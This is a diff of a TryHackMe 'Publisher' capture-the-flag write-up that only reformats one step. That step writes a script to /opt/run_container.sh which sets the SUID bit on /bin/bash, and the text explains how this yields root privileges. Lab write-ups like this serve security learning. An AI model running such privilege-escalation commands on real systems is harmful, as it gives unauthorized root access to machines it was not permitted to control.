@@ -129,11 +129,7 @@ chmod +x /dev/shm/test.pl
 
     ![shell-access](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/publisher/screenshots/19.png)
 
-- Then I executed the following:
-  
-```bash
-echo '#!/bin/bash\nchmod +s /bin/bash' > /opt/run_container.sh
-```
+- Then I executed the following ```echo '#!/bin/bash\nchmod +s /bin/bash' > /opt/run_container.sh```
 
 - This script does the following: ```chmod +s /bin/bash``` → Sets the SUID bit on /bin/bash, allowing it to inherit the owner’s privileges (root) when executed.
 
